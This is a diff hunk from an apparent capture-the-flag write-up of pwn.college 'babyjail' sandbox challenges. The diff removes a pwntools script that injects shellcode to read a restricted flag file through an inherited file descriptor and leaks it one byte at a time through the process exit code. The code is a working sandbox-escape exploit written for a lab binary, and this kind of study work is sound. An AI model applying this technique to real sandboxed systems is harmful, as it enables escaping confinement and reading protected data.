@@ -165,43 +165,6 @@ Leak one bit at a time through timing with nanosleep
 
 ``` py
 from pwn import *
-import os
-
-def main():
-    exe = ELF('/challenge/babyjail_level10')
-    context.binary = exe
-    context.log_level='info'
-    context.terminal=['tmux', 'splitw', '-v']
-
-    flag = ''
-    while '}' not in flag:
-        r = process([exe.path, '/flag'])
-        #gdb.attach(r, gdbscript='b *main+830\ndisplay/12i $rip\ndisplay $rax')
-        sc = asm(f'''
-            // read(3, buf, 0x100)
-            mov rdi, 3
-            mov rsi, rsp
-            mov rdx, 0x100
-            mov rax, 0
-            syscall
-
-            // exit(buf[i])
-            movb dil, [rsp+{len(flag)}]
-            mov rax, 60
-            syscall
-        ''')
-        r.sendline(sc)
-        r.recvall()
-        x = r.poll()
-        flag += chr(x)
-        print(flag)
-        r.close()
-
-
-if __name__ == '__main__':
-    main()
-anomie@debian:~/sb_solves$ cat sb_lvl11.py
-from pwn import *
 import time
 
 def main():
